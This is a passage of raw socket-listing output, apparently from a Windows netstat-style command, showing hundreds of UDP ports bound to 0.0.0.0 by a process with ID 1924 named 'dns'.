  UDP        0.0.0.0               52061         *:*                            1924              dns
  UDP        0.0.0.0               52062         *:*                            1924              dns
  UDP        0.0.0.0               52063         *:*                            1924              dns
  UDP        0.0.0.0               52064         *:*                            1924              dns
  UDP        0.0.0.0               52065         *:*                            1924              dns
  UDP        0.0.0.0               52066         *:*                            1924              dns
  UDP        0.0.0.0               52067         *:*                            1924              dns
  UDP        0.0.0.0               52068         *:*                            1924              dns
  UDP        0.0.0.0               52069         *:*                            1924              dns
  UDP        0.0.0.0               52070         *:*                            1924              dns
  UDP        0.0.0.0               52071         *:*                            1924              dns
  UDP        0.0.0.0               52072         *:*                            1924              dns
  UDP        0.0.0.0               52073         *:*                            1924              dns
  UDP        0.0.0.0               52074         *:*                            1924              dns
  UDP        0.0.0.0               52075         *:*                            1924              dns
  UDP        0.0.0.0               52076         *:*                            1924              dns
  UDP        0.0.0.0               52077         *:*                            1924              dns
  UDP        0.0.0.0               52078         *:*                            1924              dns
  UDP        0.0.0.0               52079         *:*                            1924              dns
  UDP        0.0.0.0               52080         *:*                            1924              dns
  UDP        0.0.0.0               52081         *:*                            1924              dns
  UDP        0.0.0.0               52082         *:*                            1924              dns
  UDP        0.0.0.0               52083         *:*                            1924              dns
  UDP        0.0.0.0               52084         *:*                            1924              dns
  UDP        0.0.0.0               52085         *:*                            1924              dns
  UDP        0.0.0.0               52086         *:*                            1924              dns
  UDP        0.0.0.0               52087         *:*                            1924              dns
  UDP        0.0.0.0               52088         *:*                            1924              dns
  UDP        0.0.0.0               52089         *:*                            1924              dns
  UDP        0.0.0.0               52090         *:*                            1924              dns
  UDP        0.0.0.0               52091         *:*                            1924              dns
  UDP        0.0.0.0               52092         *:*                            1924              dns
  UDP        0.0.0.0               52093         *:*                            1924              dns
  UDP        0.0.0.0               52094         *:*                            1924              dns
  UDP        0.0.0.0               52095         *:*                            1924              dns
  UDP        0.0.0.0               52096         *:*                            1924              dns
  UDP        0.0.0.0               52097         *:*                            1924              dns
  UDP        0.0.0.0               52098         *:*                            1924              dns
  UDP        0.0.0.0               52099         *:*                            1924              dns
  UDP        0.0.0.0               52100         *:*                            1924              dns
  UDP        0.0.0.0               52101         *:*                            1924              dns
  UDP        0.0.0.0               52102         *:*                            1924              dns
  UDP        0.0.0.0               52103         *:*                            1924              dns
  UDP        0.0.0.0               52104         *:*                            1924              dns
  UDP        0.0.0.0               52105         *:*                            1924              dns
  UDP        0.0.0.0               52106         *:*                            1924              dns
  UDP        0.0.0.0               52107         *:*                            1924              dns
  UDP        0.0.0.0               52108         *:*                            1924              dns
  UDP        0.0.0.0               52109         *:*                            1924              dns
  UDP        0.0.0.0               52110         *:*                            1924              dns
  UDP        0.0.0.0               52111         *:*                            1924              dns
  UDP        0.0.0.0               52112         *:*                            1924              dns
  UDP        0.0.0.0               52113         *:*                            1924              dns
  UDP        0.0.0.0               52114         *:*                            1924              dns
  UDP        0.0.0.0               52115         *:*                            1924              dns
  UDP        0.0.0.0               52116         *:*                            1924              dns
  UDP        0.0.0.0               52117         *:*                            1924              dns
  UDP        0.0.0.0               52118         *:*                            1924              dns
  UDP        0.0.0.0               52119         *:*                            1924              dns
  UDP        0.0.0.0               52120         *:*                            1924              dns
  UDP        0.0.0.0               52121         *:*                            1924              dns
  UDP        0.0.0.0               52122         *:*                            1924              dns
  UDP        0.0.0.0               52123         *:*                            1924              dns
  UDP        0.0.0.0               52124         *:*                            1924              dns
  UDP        0.0.0.0               52125         *:*                            1924              dns
  UDP        0.0.0.0               52126         *:*                            1924              dns
  UDP        0.0.0.0               52127         *:*                            1924              dns
  UDP        0.0.0.0               52128         *:*                            1924              dns
  UDP        0.0.0.0               52129         *:*                            1924              dns
  UDP        0.0.0.0               52130         *:*                            1924              dns
  UDP        0.0.0.0               52131         *:*                            1924              dns
  UDP        0.0.0.0               52132         *:*                            1924              dns
  UDP        0.0.0.0               52133         *:*                            1924              dns
  UDP        0.0.0.0               52134         *:*                            1924              dns
  UDP        0.0.0.0               52135         *:*                            1924              dns
  UDP        0.0.0.0               52136         *:*                            1924              dns
  UDP        0.0.0.0               52137         *:*                            1924              dns
  UDP        0.0.0.0               52138         *:*                            1924              dns
  UDP        0.0.0.0               52139         *:*                            1924              dns
  UDP        0.0.0.0               52140         *:*                            1924              dns
  UDP        0.0.0.0               52141         *:*                            1924              dns
  UDP        0.0.0.0               52142         *:*                            1924              dns
  UDP        0.0.0.0               52143         *:*                            1924              dns
  UDP        0.0.0.0               52144         *:*                            1924              dns
  UDP        0.0.0.0               52145         *:*                            1924              dns
  UDP        0.0.0.0               52146         *:*                            1924              dns
  UDP        0.0.0.0               52147         *:*                            1924              dns
  UDP        0.0.0.0               52148         *:*                            1924              dns
  UDP        0.0.0.0               52149         *:*                            1924              dns
  UDP        0.0.0.0               52150         *:*                            1924              dns
  UDP        0.0.0.0               52151         *:*                            1924              dns
  UDP        0.0.0.0               52152         *:*                            1924              dns
  UDP        0.0.0.0               52153         *:*                            1924              dns
  UDP        0.0.0.0               52154         *:*                            1924              dns
  UDP        0.0.0.0               52155         *:*                            1924              dns
  UDP        0.0.0.0               52156         *:*                            1924              dns
  UDP        0.0.0.0               52157         *:*                            1924              dns
  UDP        0.0.0.0               52158         *:*                            1924              dns
  UDP        0.0.0.0               52159         *:*                            1924              dns
  UDP        0.0.0.0               52160         *:*                            1924              dns
  UDP        0.0.0.0               52161         *:*                            1924              dns
  UDP        0.0.0.0               52162         *:*                            1924              dns
  UDP        0.0.0.0               52163         *:*                            1924              dns
  UDP        0.0.0.0               52164         *:*                            1924              dns
  UDP        0.0.0.0               52165         *:*                            1924              dns
  UDP        0.0.0.0               52166         *:*                            1924              dns
  UDP        0.0.0.0               52167         *:*                            1924              dns
  UDP        0.0.0.0               52168         *:*                            1924              dns
  UDP        0.0.0.0               52169         *:*                            1924              dns
  UDP        0.0.0.0               52170         *:*                            1924              dns
  UDP        0.0.0.0               52171         *:*                            1924              dns
  UDP        0.0.0.0               52172         *:*                            1924              dns
  UDP        0.0.0.0               52173         *:*                            1924              dns
  UDP        0.0.0.0               52174         *:*                            1924              dns
  UDP        0.0.0.0               52175         *:*                            1924              dns
  UDP        0.0.0.0               52176         *:*                            1924              dns
  UDP        0.0.0.0               52177         *:*                            1924              dns
  UDP        0.0.0.0               52178         *:*                            1924              dns
  UDP        0.0.0.0               52179         *:*                            1924              dns
  UDP        0.0.0.0               52180         *:*                            1924              dns
  UDP        0.0.0.0               52181         *:*                            1924              dns
  UDP        0.0.0.0               52182         *:*                            1924              dns
  UDP        0.0.0.0               52183         *:*                            1924              dns
  UDP        0.0.0.0               52184         *:*                            1924              dns
  UDP        0.0.0.0               52185         *:*                            1924              dns
  UDP        0.0.0.0               52186         *:*                            1924              dns
  UDP        0.0.0.0               52187         *:*                            1924              dns
  UDP        0.0.0.0               52188         *:*                            1924              dns
  UDP        0.0.0.0               52189         *:*                            1924              dns
  UDP        0.0.0.0               52190         *:*                            1924              dns
  UDP        0.0.0.0               52191         *:*                            1924              dns
  UDP        0.0.0.0               52192         *:*                            1924              dns
  UDP        0.0.0.0               52193         *:*                            1924              dns
  UDP        0.0.0.0               52194         *:*                            1924              dns
  UDP        0.0.0.0               52195         *:*                            1924              dns
  UDP        0.0.0.0               52196         *:*                            1924              dns
  UDP        0.0.0.0               52197         *:*                            1924              dns
  UDP        0.0.0.0               52198         *:*                            1924              dns
  UDP        0.0.0.0               52199         *:*                            1924              dns
  UDP        0.0.0.0               52200         *:*                            1924              dns
  UDP        0.0.0.0               52201         *:*                            1924              dns
  UDP        0.0.0.0               52202         *:*                            1924              dns
  UDP        0.0.0.0               52203         *:*                            1924              dns
  UDP        0.0.0.0               52204         *:*                            1924              dns
  UDP        0.0.0.0               52205         *:*                            1924              dns
  UDP        0.0.0.0               52206         *:*                            1924              dns
  UDP        0.0.0.0               52207         *:*                            1924              dns
  UDP        0.0.0.0               52208         *:*                            1924              dns
  UDP        0.0.0.0               52209         *:*                            1924              dns
  UDP        0.0.0.0               52210         *:*                            1924              dns
  UDP        0.0.0.0               52211         *:*                            1924              dns
  UDP        0.0.0.0               52212         *:*                            1924              dns
  UDP        0.0.0.0               52213         *:*                            1924              dns
  UDP        0.0.0.0               52214         *:*                            1924              dns
  UDP        0.0.0.0               52215         *:*                            1924              dns
  UDP        0.0.0.0               52216         *:*                            1924              dns
  UDP        0.0.0.0               52217         *:*                            1924              dns
  UDP        0.0.0.0               52218         *:*                            1924              dns
  UDP        0.0.0.0               52219         *:*                            1924              dns
  UDP        0.0.0.0               52220         *:*                            1924              dns
  UDP        0.0.0.0               52221         *:*                            1924              dns
  UDP        0.0.0.0               52222         *:*                            1924              dns
  UDP        0.0.0.0               52223         *:*                            1924              dns
  UDP        0.0.0.0               52224         *:*                            1924              dns
  UDP        0.0.0.0               52225         *:*                            1924              dns
  UDP        0.0.0.0               52226         *:*                            1924              dns
  UDP        0.0.0.0               52227         *:*                            1924              dns
  UDP        0.0.0.0               52228         *:*                            1924              dns
  UDP        0.0.0.0               52229         *:*                            1924              dns
  UDP        0.0.0.0               52230         *:*                            1924              dns
  UDP        0.0.0.0               52231         *:*                            1924              dns
  UDP        0.0.0.0               52232         *:*                            1924              dns
  UDP        0.0.0.0               52233         *:*                            1924              dns
  UDP        0.0.0.0               52234         *:*                            1924              dns
  UDP        0.0.0.0               52235         *:*                            1924              dns
  UDP        0.0.0.0               52236         *:*                            1924              dns
  UDP        0.0.0.0               52237         *:*                            1924              dns
  UDP        0.0.0.0               52238         *:*                            1924              dns
  UDP        0.0.0.0               52239         *:*                            1924              dns
  UDP        0.0.0.0               52240         *:*                            1924              dns
  UDP        0.0.0.0               52241         *:*                            1924              dns
  UDP        0.0.0.0               52242         *:*                            1924              dns
  UDP        0.0.0.0               52243         *:*                            1924              dns
  UDP        0.0.0.0               52244         *:*                            1924              dns
  UDP        0.0.0.0               52245         *:*                            1924              dns
  UDP        0.0.0.0               52246         *:*                            1924              dns
  UDP        0.0.0.0               52247         *:*                            1924              dns
  UDP        0.0.0.0               52248         *:*                            1924              dns
  UDP        0.0.0.0               52249         *:*                            1924              dns
  UDP        0.0.0.0               52250         *:*                            1924              dns
  UDP        0.0.0.0               52251         *:*                            1924              dns
  UDP        0.0.0.0               52252         *:*                            1924              dns
  UDP        0.0.0.0               52253         *:*                            1924              dns
  UDP        0.0.0.0               52254         *:*                            1924              dns
  UDP        0.0.0.0               52255         *:*                            1924              dns
  UDP        0.0.0.0               52256         *:*                            1924              dns
  UDP        0.0.0.0               52257         *:*                            1924              dns
  UDP        0.0.0.0               52258         *:*                            1924              dns
  UDP        0.0.0.0               52259         *:*                            1924              dns
  UDP        0.0.0.0               52260         *:*                            1924              dns
  UDP        0.0.0.0               52261         *:*                            1924              dns
  UDP        0.0.0.0               52262         *:*                            1924              dns
  UDP        0.0.0.0               52263         *:*                            1924              dns
  UDP        0.0.0.0               52264         *:*                            1924              dns
  UDP        0.0.0.0               52265         *:*                            1924              dns
  UDP        0.0.0.0               52266         *:*                            1924              dns
  UDP        0.0.0.0               52267         *:*                            1924              dns
  UDP        0.0.0.0               52268         *:*                            1924              dns
  UDP        0.0.0.0               52269         *:*                            1924              dns
  UDP        0.0.0.0               52270         *:*                            1924              dns
  UDP        0.0.0.0               52271         *:*                            1924              dns
  UDP        0.0.0.0               52272         *:*                            1924              dns
  UDP        0.0.0.0               52273         *:*                            1924              dns
  UDP        0.0.0.0               52274         *:*                            1924              dns
  UDP        0.0.0.0               52275         *:*                            1924              dns
  UDP        0.0.0.0               52276         *:*                            1924              dns
  UDP        0.0.0.0               52277         *:*                            1924              dns
  UDP        0.0.0.0               52278         *:*                            1924              dns
  UDP        0.0.0.0               52279         *:*                            1924              dns
  UDP        0.0.0.0               52280         *:*                            1924              dns
  UDP        0.0.0.0               52281         *:*                            1924              dns
  UDP        0.0.0.0               52282         *:*                            1924              dns
  UDP        0.0.0.0               52283         *:*                            1924              dns
  UDP        0.0.0.0               52284         *:*                            1924              dns
  UDP        0.0.0.0               52285         *:*                            1924              dns
  UDP        0.0.0.0               52286         *:*                            1924              dns
  UDP        0.0.0.0               52287         *:*                            1924              dns
  UDP        0.0.0.0               52288         *:*                            1924              dns
  UDP        0.0.0.0               52289         *:*                            1924              dns
  UDP        0.0.0.0               52290         *:*                            1924              dns
  UDP        0.0.0.0               52291         *:*                            1924              dns
  UDP        0.0.0.0               52292         *:*                            1924              dns
  UDP        0.0.0.0               52293         *:*                            1924              dns
  UDP        0.0.0.0               52294         *:*                            1924              dns
  UDP        0.0.0.0               52295         *:*                            1924              dns
  UDP        0.0.0.0               52296         *:*                            1924              dns
  UDP        0.0.0.0               52297         *:*                            1924              dns
  UDP        0.0.0.0               52298         *:*                            1924              dns
  UDP        0.0.0.0               52299         *:*                            1924              dns
  UDP        0.0.0.0               52300         *:*                            1924              dns
  UDP        0.0.0.0               52301         *:*                            1924              dns
  UDP        0.0.0.0               52302         *:*                            1924              dns
  UDP        0.0.0.0               52303         *:*                            1924              dns
  UDP        0.0.0.0               52304         *:*                            1924              dns
  UDP        0.0.0.0               52305         *:*                            1924              dns
  UDP        0.0.0.0               52306         *:*                            1924              dns
  UDP        0.0.0.0               52307         *:*                            1924              dns
  UDP        0.0.0.0               52308         *:*                            1924              dns
  UDP        0.0.0.0               52309         *:*                            1924              dns
  UDP        0.0.0.0               52310         *:*                            1924              dns
  UDP        0.0.0.0               52311         *:*                            1924              dns
  UDP        0.0.0.0               52312         *:*                            1924              dns
  UDP        0.0.0.0               52313         *:*                            1924              dns
  UDP        0.0.0.0               52314         *:*                            1924              dns
  UDP        0.0.0.0               52315         *:*                            1924              dns
  UDP        0.0.0.0               52316         *:*                            1924              dns
  UDP        0.0.0.0               52317         *:*                            1924              dns
  UDP        0.0.0.0               52318         *:*                            1924              dns
  UDP        0.0.0.0               52319         *:*                            1924              dns
  UDP        0.0.0.0               52320         *:*                            1924              dns
  UDP        0.0.0.0               52321         *:*                            1924              dns
  UDP        0.0.0.0               52322         *:*                            1924              dns
  UDP        0.0.0.0               52323         *:*                            1924              dns
  UDP        0.0.0.0               52324         *:*                            1924              dns
  UDP        0.0.0.0               52325         *:*                            1924              dns
  UDP        0.0.0.0               52326         *:*                            1924              dns
  UDP        0.0.0.0               52327         *:*                            1924              dns
  UDP        0.0.0.0               52328         *:*                            1924              dns
  UDP        0.0.0.0               52329         *:*                            1924              dns
  UDP        0.0.0.0               52330         *:*                            1924              dns
  UDP        0.0.0.0               52331         *:*                            1924              dns
  UDP        0.0.0.0               52332         *:*                            1924              dns
  UDP        0.0.0.0               52333         *:*                            1924              dns
  UDP        0.0.0.0               52334         *:*                            1924              dns
  UDP        0.0.0.0               52335         *:*                            1924              dns
  UDP        0.0.0.0               52336         *:*                            1924              dns
  UDP        0.0.0.0               52337         *:*                            1924              dns
  UDP        0.0.0.0               52338         *:*                            1924              dns
  UDP        0.0.0.0               52339         *:*                            1924              dns
  UDP        0.0.0.0               52340         *:*                            1924              dns
  UDP        0.0.0.0               52341         *:*                            1924              dns
  UDP        0.0.0.0               52342         *:*                            1924              dns
  UDP        0.0.0.0               52343         *:*                            1924              dns
  UDP        0.0.0.0               52344         *:*                            1924              dns
  UDP        0.0.0.0               52345         *:*                            1924              dns
  UDP        0.0.0.0               52346         *:*                            1924              dns
  UDP        0.0.0.0               52347         *:*                            1924              dns
  UDP        0.0.0.0               52348         *:*                            1924              dns
  UDP        0.0.0.0               52349         *:*                            1924              dns
  UDP        0.0.0.0               52350         *:*                            1924              dns
  UDP        0.0.0.0               52351         *:*                            1924              dns
  UDP        0.0.0.0               52352         *:*                            1924              dns
  UDP        0.0.0.0               52353         *:*                            1924              dns
  UDP        0.0.0.0               52354         *:*                            1924              dns
  UDP        0.0.0.0               52355         *:*                            1924              dns
  UDP        0.0.0.0               52356         *:*                            1924              dns
  UDP        0.0.0.0               52357         *:*                            1924              dns
  UDP        0.0.0.0               52358         *:*                            1924              dns
  UDP        0.0.0.0               52359         *:*                            1924              dns
  UDP        0.0.0.0               52360         *:*                            1924              dns
  UDP        0.0.0.0               52361         *:*                            1924              dns
  UDP        0.0.0.0               52362         *:*                            1924              dns
  UDP        0.0.0.0               52363         *:*                            1924              dns
  UDP        0.0.0.0               52364         *:*                            1924              dns
  UDP        0.0.0.0               52365         *:*                            1924              dns
  UDP        0.0.0.0               52366         *:*                            1924              dns
  UDP        0.0.0.0               52367         *:*                            1924              dns
  UDP        0.0.0.0               52368         *:*                            1924              dns
  UDP        0.0.0.0               52369         *:*                            1924              dns
  UDP        0.0.0.0               52370         *:*                            1924              dns
  UDP        0.0.0.0               58756         *:*                            1924              dns
  UDP        0.0.0.0               58757         *:*                            1924              dns
  UDP        0.0.0.0               58758         *:*                            1924              dns
  UDP        0.0.0.0               58759         *:*                            1924              dns
  UDP        0.0.0.0               58760         *:*                            1924              dns
  UDP        0.0.0.0               58761         *:*                            1924              dns
  UDP        0.0.0.0               58762         *:*                            1924              dns
  UDP        0.0.0.0               58763         *:*                            1924              dns
  UDP        0.0.0.0               58764         *:*                            1924              dns
  UDP        0.0.0.0               58765         *:*                            1924              dns
  UDP        0.0.0.0               58766         *:*                            1924              dns
  UDP        0.0.0.0               58767         *:*                            1924              dns
  UDP        0.0.0.0               58768         *:*                            1924              dns
  UDP        0.0.0.0               58769         *:*                            1924              dns
  UDP        0.0.0.0               58770         *:*                            1924              dns
  UDP        0.0.0.0               58771         *:*                            1924              dns
  UDP        0.0.0.0               58772         *:*                            1924              dns
  UDP        0.0.0.0               58773         *:*                            1924              dns
  UDP        0.0.0.0               58774         *:*                            1924              dns
  UDP        0.0.0.0               58775         *:*                            1924              dns
  UDP        0.0.0.0               58776         *:*                            1924              dns
  UDP        0.0.0.0               58777         *:*                            1924              dns
  UDP        0.0.0.0               58778         *:*                            1924              dns
  UDP        0.0.0.0               58779         *:*                            1924              dns
  UDP        0.0.0.0               58780         *:*                            1924              dns
  UDP        0.0.0.0               58781         *:*                            1924              dns
  UDP        0.0.0.0               58782         *:*                            1924              dns
  UDP        0.0.0.0               58783         *:*                            1924              dns
  UDP        0.0.0.0               58784         *:*                            1924              dns
  UDP        0.0.0.0               58785         *:*                            1924              dns
  UDP        0.0.0.0               58786         *:*                            1924              dns
  UDP        0.0.0.0               58787         *:*                            1924              dns
  UDP        0.0.0.0               58788         *:*                            1924              dns
  UDP        0.0.0.0               58789         *:*                            1924              dns
  UDP        0.0.0.0               58790         *:*                            1924              dns
  UDP        0.0.0.0               58791         *:*                            1924              dns
  UDP        0.0.0.0               58792         *:*                            1924              dns
  UDP        0.0.0.0               58793         *:*                            1924              dns
  UDP        0.0.0.0               58794         *:*                            1924              dns
  UDP        0.0.0.0               58795         *:*                            1924              dns
  UDP        0.0.0.0               58796         *:*                            1924              dns
  UDP        0.0.0.0               58797         *:*                            1924              dns
  UDP        0.0.0.0               58798         *:*                            1924              dns
  UDP        0.0.0.0               58799         *:*                            1924              dns
  UDP        0.0.0.0               58800         *:*                            1924              dns
  UDP        0.0.0.0               58801         *:*                            1924              dns
  UDP        0.0.0.0               58802         *:*                            1924              dns
  UDP        0.0.0.0               58803         *:*                            1924              dns
  UDP        0.0.0.0               58804         *:*                            1924              dns
  UDP        0.0.0.0               58805         *:*                            1924              dns
  UDP        0.0.0.0               58806         *:*                            1924              dns
  UDP        0.0.0.0               58807         *:*                            1924              dns
  UDP        0.0.0.0               58808         *:*                            1924              dns
  UDP        0.0.0.0               58809         *:*                            1924              dns
  UDP        0.0.0.0               58810         *:*                            1924              dns
  UDP        0.0.0.0               58811         *:*                            1924              dns
  UDP        0.0.0.0               58812         *:*                            1924              dns
  UDP        0.0.0.0               58813         *:*                            1924              dns
  UDP        0.0.0.0               58814         *:*                            1924              dns
  UDP        0.0.0.0               58815         *:*                            1924              dns
  UDP        0.0.0.0               58816         *:*                            1924              dns
  UDP        0.0.0.0               58817         *:*                            1924              dns
  UDP        0.0.0.0               58818         *:*                            1924              dns
  UDP        0.0.0.0               58819         *:*                            1924              dns
  UDP        0.0.0.0               58820         *:*                            1924              dns
  UDP        0.0.0.0               58821         *:*                            1924              dns
  UDP        0.0.0.0               58822         *:*                            1924              dns
  UDP        0.0.0.0               58823         *:*                            1924              dns
  UDP        0.0.0.0               58824         *:*                            1924              dns
  UDP        0.0.0.0               58825         *:*                            1924              dns
  UDP        0.0.0.0               58826         *:*                            1924              dns
  UDP        0.0.0.0               58827         *:*                            1924              dns
  UDP        0.0.0.0               58828         *:*                            1924              dns
  UDP        0.0.0.0               58829         *:*                            1924              dns
  UDP        0.0.0.0               58830         *:*                            1924              dns
  UDP        0.0.0.0               58831         *:*                            1924              dns
  UDP        0.0.0.0               58832         *:*                            1924              dns
  UDP        0.0.0.0               58833         *:*                            1924              dns
  UDP        0.0.0.0               58834         *:*                            1924              dns
  UDP        0.0.0.0               58835         *:*                            1924              dns
  UDP        0.0.0.0               58836         *:*                            1924              dns
  UDP        0.0.0.0               58837         *:*                            1924              dns
  UDP        0.0.0.0               58838         *:*                            1924              dns
  UDP        0.0.0.0               58839         *:*                            1924              dns
  UDP        0.0.0.0               58840         *:*                            1924              dns
  UDP        0.0.0.0               58841         *:*                            1924              dns
  UDP        0.0.0.0               58842         *:*                            1924              dns
  UDP        0.0.0.0               58843         *:*                            1924              dns
  UDP        0.0.0.0               58844         *:*                            1924              dns
  UDP        0.0.0.0               58845         *:*                            1924              dns
  UDP        0.0.0.0               58846         *:*                            1924              dns
  UDP        0.0.0.0               58847         *:*                            1924              dns
  UDP        0.0.0.0               58848         *:*                            1924              dns
  UDP        0.0.0.0               58849         *:*                            1924              dns
  UDP        0.0.0.0               58850         *:*                            1924              dns
  UDP        0.0.0.0               58851         *:*                            1924              dns
  UDP        0.0.0.0               58852         *:*                            1924              dns
  UDP        0.0.0.0               58853         *:*                            1924              dns
  UDP        0.0.0.0               58854         *:*                            1924              dns
  UDP        0.0.0.0               58855         *:*                            1924              dns
  UDP        0.0.0.0               58856         *:*                            1924              dns
  UDP        0.0.0.0               58857         *:*                            1924              dns
  UDP        0.0.0.0               58858         *:*                            1924              dns
  UDP        0.0.0.0               58859         *:*                            1924              dns
  UDP        0.0.0.0               58860         *:*                            1924              dns
  UDP        0.0.0.0               58861         *:*                            1924              dns
  UDP        0.0.0.0               58862         *:*                            1924              dns
  UDP        0.0.0.0               58863         *:*                            1924              dns
  UDP        0.0.0.0               58864         *:*                            1924              dns
  UDP        0.0.0.0               58865         *:*                            1924              dns
  UDP        0.0.0.0               58866         *:*                            1924              dns
  UDP        0.0.0.0               58867         *:*                            1924              dns
  UDP        0.0.0.0               58868         *:*                            1924              dns
  UDP        0.0.0.0               58869         *:*                            1924              dns
  UDP        0.0.0.0               58870         *:*                            1924              dns
  UDP        0.0.0.0               58871         *:*                            1924              dns
  UDP        0.0.0.0               58872         *:*                            1924              dns
  UDP        0.0.0.0               58873         *:*                            1924              dns
  UDP        0.0.0.0               58874         *:*                            1924              dns
  UDP        0.0.0.0               58875         *:*                            1924              dns
  UDP        0.0.0.0               58876         *:*                            1924              dns
  UDP        0.0.0.0               58877         *:*                            1924              dns
  UDP        0.0.0.0               58878         *:*                            1924              dns
  UDP        0.0.0.0               58879         *:*                            1924              dns
  UDP        0.0.0.0               58880         *:*                            1924              dns
  UDP        0.0.0.0               58881         *:*                            1924              dns
  UDP        0.0.0.0               58882         *:*                            1924              dns
  UDP        0.0.0.0               58883         *:*                            1924              dns
  UDP        0.0.0.0               58884         *:*                            1924              dns
  UDP        0.0.0.0               58885         *:*                            1924              dns
  UDP        0.0.0.0               58886         *:*                            1924              dns
  UDP        0.0.0.0               58887         *:*                            1924              dns
  UDP        0.0.0.0               58888         *:*                            1924              dns
  UDP        0.0.0.0               58889         *:*                            1924              dns
  UDP        0.0.0.0               58890         *:*                            1924              dns
  UDP        0.0.0.0               58891         *:*                            1924              dns
  UDP        0.0.0.0               58892         *:*                            1924              dns
  UDP        0.0.0.0               58893         *:*                            1924              dns
  UDP        0.0.0.0               58894         *:*                            1924              dns
  UDP        0.0.0.0               58895         *:*                            1924              dns
  UDP        0.0.0.0               58896         *:*                            1924              dns
  UDP        0.0.0.0               58897         *:*                            1924              dns
  UDP        0.0.0.0               58898         *:*                            1924              dns
  UDP        0.0.0.0               58899         *:*                            1924              dns
  UDP        0.0.0.0               58900         *:*                            1924              dns
  UDP        0.0.0.0               58901         *:*                            1924              dns
  UDP        0.0.0.0               58902         *:*                            1924              dns
  UDP        0.0.0.0               58903         *:*                            1924              dns
  UDP        0.0.0.0               58904         *:*                            1924              dns
  UDP        0.0.0.0               58905         *:*                            1924              dns
  UDP        0.0.0.0               58906         *:*                            1924              dns
  UDP        0.0.0.0               58907         *:*                            1924              dns
  UDP        0.0.0.0               58908         *:*                            1924              dns
  UDP        0.0.0.0               58909         *:*                            1924              dns
  UDP        0.0.0.0               58910         *:*                            1924              dns
  UDP        0.0.0.0               58911         *:*                            1924              dns
  UDP        0.0.0.0               58912         *:*                            1924              dns
  UDP        0.0.0.0               58913         *:*                            1924              dns
  UDP        0.0.0.0               58914         *:*                            1924              dns
  UDP        0.0.0.0               58915         *:*                            1924              dns
  UDP        0.0.0.0               58916         *:*                            1924              dns
  UDP        0.0.0.0               58917         *:*                            1924              dns
  UDP        0.0.0.0               58918         *:*                            1924              dns
  UDP        0.0.0.0               58919         *:*                            1924              dns
  UDP        0.0.0.0               58920         *:*                            1924              dns
  UDP        0.0.0.0               58921         *:*                            1924              dns
  UDP        0.0.0.0               58922         *:*                            1924              dns
  UDP        0.0.0.0               58923         *:*                            1924              dns
  UDP        0.0.0.0               58924         *:*                            1924              dns
  UDP        0.0.0.0               58925         *:*                            1924              dns
  UDP        0.0.0.0               58926         *:*                            1924              dns
  UDP        0.0.0.0               58927         *:*                            1924              dns
  UDP        0.0.0.0               58928         *:*                            1924              dns
  UDP        0.0.0.0               58929         *:*                            1924              dns
  UDP        0.0.0.0               58930         *:*                            1924              dns
  UDP        0.0.0.0               58931         *:*                            1924              dns
  UDP        0.0.0.0               58932         *:*                            1924              dns
  UDP        0.0.0.0               58933         *:*                            1924              dns
  UDP        0.0.0.0               58934         *:*                            1924              dns
  UDP        0.0.0.0               58935         *:*                            1924              dns
  UDP        0.0.0.0               58936         *:*                            1924              dns
  UDP        0.0.0.0               58937         *:*                            1924              dns
  UDP        0.0.0.0               58938         *:*                            1924              dns
  UDP        0.0.0.0               58939         *:*                            1924              dns
  UDP        0.0.0.0               58940         *:*                            1924              dns
  UDP        0.0.0.0               58941         *:*                            1924              dns
  UDP        0.0.0.0               58942         *:*                            1924              dns
  UDP        0.0.0.0               58943         *:*                            1924              dns
  UDP        0.0.0.0               58944         *:*                            1924              dns
  UDP        0.0.0.0               58945         *:*                            1924              dns
  UDP        0.0.0.0               58946         *:*                            1924              dns
  UDP        0.0.0.0               58947         *:*                            1924              dns
  UDP        0.0.0.0               58948         *:*                            1924              dns
  UDP        0.0.0.0               58949         *:*                            1924              dns
  UDP        0.0.0.0               58950         *:*                            1924              dns
  UDP        0.0.0.0               58951         *:*                            1924              dns
  UDP        0.0.0.0               58952         *:*                            1924              dns
  UDP        0.0.0.0               58953         *:*                            1924              dns
  UDP        0.0.0.0               58954         *:*                            1924              dns
  UDP        0.0.0.0               58955         *:*                            1924              dns
  UDP        0.0.0.0               58956         *:*                            1924              dns
  UDP        0.0.0.0               58957         *:*                            1924              dns
  UDP        0.0.0.0               58958         *:*                            1924              dns
  UDP        0.0.0.0               58959         *:*                            1924              dns
  UDP        0.0.0.0               58960         *:*                            1924              dns
  UDP        0.0.0.0               58961         *:*                            1924              dns
  UDP        0.0.0.0               58962         *:*                            1924              dns
  UDP        0.0.0.0               58963         *:*                            1924              dns
  UDP        0.0.0.0               58964         *:*                            1924              dns
  UDP        0.0.0.0               58965         *:*                            1924              dns
  UDP        0.0.0.0               58966         *:*                            1924              dns
  UDP        0.0.0.0               58967         *:*                            1924              dns
  UDP        0.0.0.0               58968         *:*                            1924              dns
  UDP        0.0.0.0               58969         *:*                            1924              dns
  UDP        0.0.0.0               58970         *:*                            1924              dns
  UDP        0.0.0.0               58971         *:*                            1924              dns
  UDP        0.0.0.0               58972         *:*                            1924              dns
  UDP        0.0.0.0               58973         *:*                            1924              dns
  UDP        0.0.0.0               58974         *:*                            1924              dns
  UDP        0.0.0.0               58975         *:*                            1924              dns
  UDP        0.0.0.0               58976         *:*                            1924              dns
  UDP        0.0.0.0               58977         *:*                            1924              dns
  UDP        0.0.0.0               58978         *:*                            1924              dns
  UDP        0.0.0.0               58979         *:*                            1924              dns
  UDP        0.0.0.0               58980         *:*                            1924              dns
  UDP        0.0.0.0               58981         *:*                            1924              dns
  UDP        0.0.0.0               58982         *:*                            1924              dns
  UDP        0.0.0.0               58983         *:*                            1924              dns
  UDP        0.0.0.0               58984         *:*                            1924              dns
  UDP        0.0.0.0               58985         *:*                            1924              dns
  UDP        0.0.0.0               58986         *:*                            1924              dns
  UDP        0.0.0.0               58987         *:*                            1924              dns
  UDP        0.0.0.0               58988         *:*                            1924              dns
  UDP        0.0.0.0               58989         *:*                            1924              dns
  UDP        0.0.0.0               58990         *:*                            1924              dns
  UDP        0.0.0.0               58991         *:*                            1924              dns
  UDP        0.0.0.0               58992         *:*                            1924              dns
  UDP        0.0.0.0               58993         *:*                            1924              dns
  UDP        0.0.0.0               58994         *:*                            1924              dns
  UDP        0.0.0.0               58995         *:*                            1924              dns
  UDP        0.0.0.0               58996         *:*                            1924              dns
  UDP        0.0.0.0               58997         *:*                            1924              dns
  UDP        0.0.0.0               58998         *:*                            1924              dns
  UDP        0.0.0.0               58999         *:*                            1924              dns
  UDP        0.0.0.0               59000         *:*                            1924              dns
